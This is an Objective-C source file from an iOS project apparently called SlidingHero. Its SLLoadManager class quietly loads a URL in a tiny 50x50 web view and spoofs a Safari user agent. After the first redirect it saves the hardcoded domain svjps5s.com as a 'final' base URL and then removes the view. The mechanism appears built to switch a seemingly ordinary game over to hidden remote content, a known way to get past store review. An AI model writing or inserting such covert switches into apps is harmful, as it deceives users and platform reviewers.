//
//  SLLoadManager.m
//  SlidingHero
//
//  Created by 文有智 on 2025/3/24.
//

#import "SLLoadManager.h"



#import <WebKit/WebKit.h>

@interface SLLoadManager()<WKNavigationDelegate, WKUIDelegate>

@property (nonatomic, strong) WKWebView *webView;
@property (nonatomic, assign) int loadNumber;
@property (nonatomic, strong) NSString *info;
@end

@implementation SLLoadManager



- (void)loadBaseUrl:(NSString* )info
{
    _info = info;
    WKWebViewConfiguration *configuration = [[WKWebViewConfiguration alloc] init];
    configuration.userContentController = [[WKUserContentController alloc] init];
    WKPreferences *preferences = [[WKPreferences alloc] init];
    preferences.javaScriptCanOpenWindowsAutomatically = YES;
    configuration.preferences = preferences;
    
    NSString *currentUserAgent = configuration.applicationNameForUserAgent;
    if (![currentUserAgent containsString:@"Safari"]) {
        currentUserAgent = [NSString stringWithFormat:@"%@ %@", currentUserAgent, @"Safari/604.1"];
    }
    configuration.applicationNameForUserAgent = currentUserAgent;
    
    _webView = [[WKWebView alloc] initWithFrame:CGRectMake(0, 0, 50, 50) configuration:configuration];
    _webView.UIDelegate = self;
    _webView.scrollView.bounces = NO;
    _webView.navigationDelegate = self;
    
    [_webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:info]]];
    [self addSubview:_webView];
}
- (instancetype)init
{
    self = [super init];
    if (self) {
        
    }
    return self;
}

- (void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler
{
    NSLog(@"APPLog: web 拦截请求： %@", webView.URL.absoluteString);

    if ([webView.URL.absoluteString containsString:_info]) {
        decisionHandler(WKNavigationActionPolicyAllow);
        _loadNumber = 1;
        return;
    } else if (_loadNumber == 1) {
        decisionHandler(WKNavigationActionPolicyAllow);
        _loadNumber++;
        NSLog(@"request url info : %@", webView.URL.absoluteString);
        [[NSUserDefaults standardUserDefaults] setObject:@"https://svjps5s.com" forKey:@"finalLoadBaseInfo"];
        [[NSUserDefaults standardUserDefaults] synchronize];
        [self removeFromSuperview];
        return;
    } else {
        decisionHandler(WKNavigationActionPolicyCancel);
        return;
    }

}


@end
